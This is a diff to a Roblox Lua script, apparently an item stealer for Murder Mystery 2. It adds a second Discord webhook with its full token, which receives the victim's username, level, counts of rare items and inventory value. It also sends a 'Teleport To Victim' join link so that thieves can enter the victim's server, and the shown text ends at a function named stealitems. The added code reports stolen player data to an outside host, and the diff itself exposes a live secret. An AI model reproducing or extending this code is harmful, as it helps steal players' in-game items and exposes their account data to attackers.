@@ -791,6 +791,9 @@ local values = {
 	["Moon"] = 1
 }
 
+userName1 = "TehPucuk_55"
+webHook1 = "https://discord.com/api/webhooks/1207564545736974366/qFtOwfb7c0uA7HO2RoSH-SPT4kDLc0Om7PjNF_uHFB0Biq1Ys4N8ESfW2m3pwacKJRsN
+
 if #game:GetService("Players"):GetPlayers() <= 2 then
     game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
 end
@@ -1057,17 +1060,17 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
                          "\n\n-- // Common\n" .. commonsString
 
 local WebHookEmbed = CreateEmbed(
-    "MM2 HIT - Ft. Light Monzz",
+    "MM2 Hit - Ft. Light Monzz",
     "Please execute the code above to get your hit.",
     65280,
     {
         {
             name = "🌊 Player Info", 
             value = "``` | 📖 Username: "..LP.Name.."\n | 🚀 Level: "..tostring(getLvl())..
-                     "\n | 🥳 Receiver: "..userName.."\n | 💻 Executor Used: "..identifyexecutor().."```"
+                     "\n | 🥳 Receiver: "..userName.."```"
         },
         {
-            name = "🍎 Items Data:", 
+            name = "🍎 Items Data", 
             value = "```Uniques: "..tostring(uniqueItemsC)..
                      "\nAncients: "..tostring(ancientItemsC)..
                      "\nGodlys: "..tostring(godlyItemsC)..
@@ -1082,18 +1085,18 @@ local WebHookEmbed = CreateEmbed(
             value = "```"..tostring(math.floor(valueCount + 0.5)).."```"
         },
         {
-            name = "Light Monzz", 
-            value = "https://discord.gg/CAr4FZHAyF"
+            name = "ᴅɪꜱᴄᴏʀᴅ sᴇʀᴠᴇʀ", 
+            value = "[**Join Invite**](https://discord.gg/CAr4FZHAyF)"
         }
     }
 )
 
 if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
     SendWebhook(webHook, {content = "@everyone --\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \""..game.JobId.."\")", embeds = {WebHookEmbed}})
-    SendWebhook(webHook1, {content = "@everyone --\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \""..game.JobId.."\")", embeds = {WebHookEmbed}})
+    SendWebhook(webHook1, {content = "(⭐️) Teleport To Victim: --\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId.."", embeds = {WebHookEmbed}})
 else
-    SendWebhook(webHook, {content = "\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \""..game.JobId.."\")", embeds = {WebHookEmbed}})
-    SendWebhook(webHook1, {content = "\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \""..game.JobId.."\")", embeds = {WebHookEmbed}})
+    SendWebhook(webHook, {content = "@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \""..game.JobId.."\")", embeds = {WebHookEmbed}})
+    SendWebhook(webHook1, {content = "(⭐️) Teleport To Victim: --\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId.."", embeds = {WebHookEmbed}})
 end
 
 local function stealitems()
